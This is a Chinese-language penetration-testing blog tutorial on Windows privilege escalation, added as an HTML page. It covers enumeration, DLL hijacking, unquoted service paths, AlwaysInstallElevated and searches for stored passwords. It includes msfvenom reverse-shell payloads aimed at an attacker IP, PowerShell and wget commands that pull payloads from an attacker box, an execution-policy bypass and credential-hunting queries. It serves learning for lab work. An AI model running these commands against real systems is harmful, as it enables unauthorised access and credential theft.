@@ -1,0 +1,586 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Doraemoo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Windows 提权基础信息收集用户枚举当前用户的权限：whoami &#x2F;priv 列出用户：net users 列出用户的详细信息：nte user username 列出用户组：net localgroup 列出特定组成员：net localgroup groupname 收集系统信息systeminfo 命令将返回目标系统的概述信息。 通常输出信息数据量会很大，可以过滤输出 systeminf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权基础">
+<meta property="og:url" content="https://doraemoo.github.io/2022/04/28/Windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Doraemoo">
+<meta property="og:description" content="Windows 提权基础信息收集用户枚举当前用户的权限：whoami &#x2F;priv 列出用户：net users 列出用户的详细信息：nte user username 列出用户组：net localgroup 列出特定组成员：net localgroup groupname 收集系统信息systeminfo 命令将返回目标系统的概述信息。 通常输出信息数据量会很大，可以过滤输出 systeminf">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-28T06:07:13.000Z">
+<meta property="article:modified_time" content="2022-04-28T06:07:55.107Z">
+<meta property="article:author" content="Doraemoo">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>Windows提权基础 - Doraemoo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"doraemoo.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":17691437,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Doraemoo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://w.wallhaven.cc/full/wq/wallhaven-wqv5xx.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Windows提权基础">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-28 14:07" pubdate>
+        2022年4月28日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      39 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Windows提权基础</h1>
+            
+            <div class="markdown-body">
+              <h2 id="Windows-提权基础"><a href="#Windows-提权基础" class="headerlink" title="Windows 提权基础"></a>Windows 提权基础</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h4><p>当前用户的权限：<code>whoami /priv</code></p>
+<p>列出用户：<code>net users</code></p>
+<p>列出用户的详细信息：<code>nte user username</code></p>
+<p>列出用户组：<code>net localgroup</code></p>
+<p>列出特定组成员：<code>net localgroup groupname</code></p>
+<h4 id="收集系统信息"><a href="#收集系统信息" class="headerlink" title="收集系统信息"></a>收集系统信息</h4><p><code>systeminfo</code> 命令将返回目标系统的概述信息。</p>
+<p>通常输出信息数据量会很大，可以过滤输出</p>
+<p><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></p>
+<p>计算机名称还可以提供一些关于系统用途或用户身份的信息。<code>hostname</code>命令可用于此目的.</p>
+<h4 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h4><p><code>findstr</code>命令可用于以类似于下面给出的格式查找此类文件</p>
+<p><code>findstr /si password *.txt</code></p>
+<p><code>findstr</code>：搜索文件中的文本模式。</p>
+<p><code>/si</code>：搜索当前目录和所有子目录（s），忽略大写&#x2F;小写差异（i）</p>
+<p><code>password</code>：该命令将在文件中搜索字符串“password”</p>
+<p><code>*.txt</code>：搜索将涵盖具有 .txt 扩展名的文件</p>
+<h4 id="补丁级别"><a href="#补丁级别" class="headerlink" title="补丁级别"></a>补丁级别</h4><p><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p>
+<h4 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h4><p><code>netstat -ano</code> 命令可用于列出目标系统上的所有侦听端口</p>
+<ul>
+<li><code>-a</code>：显示目标系统上的所有活动连接和侦听端口。</li>
+<li><code>-n</code>: 防止名称解析。IP 地址和端口以数字显示，而不是尝试使用DNS解析名称。</li>
+<li><code>-o</code>：显示使用每个列出的连接的进程 ID。</li>
+</ul>
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p><code>schtasks</code> 命令可用于查询计划任务</p>
+<p><code>schtasks /query /fo LIST /v</code></p>
+<h4 id="驱动程序"><a href="#驱动程序" class="headerlink" title="驱动程序"></a>驱动程序</h4><p><code>driverquery</code> 命令将列出目标系统上安装的驱动程序</p>
+<p>虽然操作系统更新通常相对定期进行，但驱动程序可能不会经常更新。列出目标系统上可用的驱动程序也可以提供权限提升方向。</p>
+<h4 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h4><p><code>sc query windefend</code>Windows Defender的服务名称是windefend</p>
+<p>第二种方法可以让您在事先不知道其服务名称的情况下检测防病毒软件</p>
+<p><code>sc queryex type=service</code></p>
+<p><strong>提醒</strong>：要在目标系统上运行 PowerUp，可能需要绕过执行策略限制。为此，可以使用以下命令启动 PowerShell。</p>
+<p><code>powershell.exe -nop -exec bypass</code></p>
+<h3 id="易受攻击的软件"><a href="#易受攻击的软件" class="headerlink" title="易受攻击的软件"></a>易受攻击的软件</h3><p>安装在目标系统上的软件可以提供各种权限提升机会。</p>
+<p><code>wmic</code> 之前看到目标系统上安装的软件及其版本。</p>
+<p><code>wmic product</code>可以收集的已安装软件的信息。</p>
+<p><code>wmic product get name,version,vendor</code></p>
+<p><code>wmic service list brief</code>检查正在运行的服务</p>
+<p><code>wmic service list brief | findstr &quot;Running&quot;</code></p>
+<p><code>sc qc</code>列出有关服务的更多信息</p>
+<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>如果我们可以用特制的 DLL 文件切换合法的 DLL 文件，我们的代码将由应用程序运行。DLL 劫持需要一个应用程序（通常是一个 exe 文件），该应用程序要么缺少 DLL 文件，要么可以使用搜索顺序插入恶意 DLL 文件。</p>
+<h4 id="DLL文件简介"><a href="#DLL文件简介" class="headerlink" title="DLL文件简介"></a>DLL文件简介</h4><p>Windows使用很多dll文件</p>
+<p>一些文件类型是“应用程序”，而其他文件类型（查找 .dll 扩展名）被描述为“应用程序扩展名”。因此，当应用程序运行时，它会出于不同目的“调用”这些其他文件。任何应用程序都可以拥有自己的 DLL 文件，但也可以调用 Windows DLL 文件。</p>
+<p>DLL劫持场景包括用恶意 DLL 文件替换合法 DLL 文件，该恶意 DLL 文件将由可执行文件调用并运行。</p>
+<h4 id="DLL-搜索顺序"><a href="#DLL-搜索顺序" class="headerlink" title="DLL 搜索顺序"></a>DLL 搜索顺序</h4><p>如果启用<strong>SafeDllSearchMode</strong>，则搜索顺序如下：</p>
+<ol>
+<li>加载应用程序的目录。</li>
+<li>系统目录。使用 <strong><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya">GetSystemDirectory</a></strong> 函数获取该目录的路径。</li>
+<li>16 位系统目录。没有函数获取这个目录的路径，但是被搜索了。</li>
+<li>Windows 目录。使用 <strong><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya">GetWindowsDirectory</a></strong> 函数获取该目录的路径。</li>
+<li>当前目录。</li>
+<li>PATH 环境变量中列出的目录。请注意，这不包括<strong>App Paths</strong>注册表项指定的每个应用程序路径。计算DLL搜索路径 时不使用<strong>App Paths键。</strong></li>
+</ol>
+<p>如果禁用<strong>SafeDllSearchMode</strong>，则搜索顺序如下：</p>
+<ol>
+<li>加载应用程序的目录。</li>
+<li>当前目录。</li>
+<li>系统目录。使用 <strong><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya">GetSystemDirectory</a></strong> 函数获取该目录的路径。</li>
+<li>16 位系统目录。没有函数获取这个目录的路径，但是被搜索了。</li>
+<li>Windows 目录。使用 <strong><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya">GetWindowsDirectory</a></strong> 函数获取该目录的路径。</li>
+<li>PATH 环境变量中列出的目录。请注意，这不包括<strong>App Paths</strong>注册表项指定的每个应用程序路径。计算DLL 搜索路径时不使用 <strong>App Paths键。</strong></li>
+</ol>
+<p>如果在系统上拥有的用户权限允许我们按搜索顺序写入任何文件夹，就有可能存在 DLL 劫持漏洞。</p>
+<h4 id="查找-DLL-劫持漏洞"><a href="#查找-DLL-劫持漏洞" class="headerlink" title="查找 DLL 劫持漏洞"></a>查找 DLL 劫持漏洞</h4><p>可用于查找潜在 DLL 劫持漏洞的工具是 Process Monitor </p>
+<p>如果想检查软件是否存在潜在的 DLL 劫持漏洞，需要在测试环境中安装该软件进行研究。</p>
+<h4 id="创建恶意-DLL-文件"><a href="#创建恶意-DLL-文件" class="headerlink" title="创建恶意 DLL 文件"></a>创建恶意 DLL 文件</h4><p>创建的 DLL 文件可以是反向 shell 或操作系统命令，具体取决于希望在目标系统上实现的目标下面的示例是一个框架 DLL 文件，可以根据需要进行调整。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span> <span class="hljs-params">(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;<br>        system(<span class="hljs-string">&quot;cmd.exe /k whoami &gt; C:\\Temp\\dll.txt&quot;</span>);<br>        ExitProcess(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>mingw 编译器可用于生成 DLL 文件，命令如下：</p>
+<p><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</code></p>
+<p>使用<code>apt install gcc-mingw-w64-x86-64</code>命令安装 Mingw 编译器。</p>
+<p>编译完成后，我们需要将dll 文件移动到目标系统的 Temp 文件夹中。可以使用以下 PowerShell 命令将 .dll 文件下载到目标系统：</p>
+<p><code>wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll</code></p>
+<p>再次停止并启动 dllsvc 服务：</p>
+<p><code>sc stop dllsvc &amp; sc start dllsvc</code></p>
+<h3 id="未引用的服务路径"><a href="#未引用的服务路径" class="headerlink" title="未引用的服务路径"></a>未引用的服务路径</h3><p>再windows中启动服务时，操作系统必须查找并运行可执行文件。<br>例如，netlogon服务（负责对域中用户进行身份验证）实际上是指<code>C:\Windows\system32\lsass.exe</code> 二进制文件。</p>
+<p>当服务启动时，Windows 会遵循类似于DLL中看到的搜索顺序<br>例如现有服务srvc它的二进制路径设置为<code> C:\Program Files\topservice folder\subservice subfolder\srvc.exe</code></p>
+<p>从人眼来看以上路径与<code>&quot;C:\Program Files\topservice folder\subservice subfolder\srvc.exe&quot;</code>不同。</p>
+<p>Windows处理方式为，如果路径写在引号之间，Windows 将直接转到正确的位置并启动 service.exe</p>
+<p>但是，如果路径没有写在引号之间，并且路径中的任何文件夹名称中有空格，<br>Windows将附加”.exe”.并开始寻找可执行文件，从最短的路径开始在以上的路径中，<br>这将是<code>C:\Program.exe</code>。如果 program.exe 不可用，<br>第二次尝试是在<code>C:\Program Files\</code> 下运行 topservice.exe。<br>如果这也失败，将对 <code>C:\Program Files\topservice folder\subservice.exe</code> 进行另一次尝试。重复此过程，直到找到可执行文件。</p>
+<h4 id="查找未引用的服务路径漏洞"><a href="#查找未引用的服务路径漏洞" class="headerlink" title="查找未引用的服务路径漏洞"></a>查找未引用的服务路径漏洞</h4><p>winPEAS 和 PowerUp.ps1 等工具会检测未引用的服务路径。<br>需要确保满足利用该漏洞的其他要求:</p>
+<ol>
+<li>能够写入路径上的文件夹</li>
+<li>能够重新启动服务</li>
+</ol>
+<p>使用winPEAS找出路径没有在引号之间的服务名称<br><code>sc qc unquotedsvc</code>命令进一步检查此服务的二进制路径<br><code> C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</code><br>然后需要检查我们对路径中文件夹的权限 如：<br><code>.\accesschk64.exe /accepteula -dvqw &quot;C:\Program Files\Unquoted Path Service\&quot;</code><br>输出将列出对“Program Files”文件夹具有读取 (R) 和写入 (W) 权限的用户组</p>
+<p>找到可写入的文件夹后，上传反向shell。并在攻击机上监听4444端口<br><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.71.123 LPORT=4444 -f exe &gt; Common.exe</code></p>
+<p><code>powershell wget http://10.11.71.123/Common.exe -o C:\Program Files\Unquoted Path Service\Common.exe </code></p>
+<p>生成文件并将其移动到目标计算机上的正确位置后，需要重新启动易受攻击的服务。<br><code>net start unquotedsvc</code></p>
+<p>运行成功后得到reverse shell</p>
+<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><p><code>schtasks</code>命令从命令行列出计划任务<br><code>Autoruns64.exe</code></p>
+<h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。<br>通常以启动它的用户的权限级别运行。但是，如果安装需要管理员权限，则可以将它们配置为以更高的权限运行。</p>
+<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些。<br><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code><br><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code><br>为了能够利用此漏洞，两者都应该设置。否则，将无法利用。<br>如果设置了这些，可以使用 生成恶意 .msi 文件<code>msfvenom</code>，如下所示。<br><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.171.123 LPORT=4444 -f msi -o malicious.msi</code></p>
+<p>在目标系统上运行<br><code>C:\Users\user\Desktop&gt;msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</code></p>
+<h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><p> <strong>保存的凭据</strong><br> Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据。<br> <code>cmdkey /list</code><br> 如果您看到任何值得尝试的凭据，您可以将它们与<code>runas</code> 命令和<code>/savecred</code>选项一起使用，<code>runas /savecred /user:admin reverse_shell.exe</code></p>
+<p><strong>注册表项</strong><br>可以使用以下命令查询可能包含密码的注册表项<br><code>reg query HKLM /f password /t REG_SZ /s</code><br><code>reg query HKCU /f password /t REG_SZ /s</code></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Pentest/">Pentest</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/27/Linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/">
+                        <span class="hidden-mobile">Linux提权基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?17691437";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
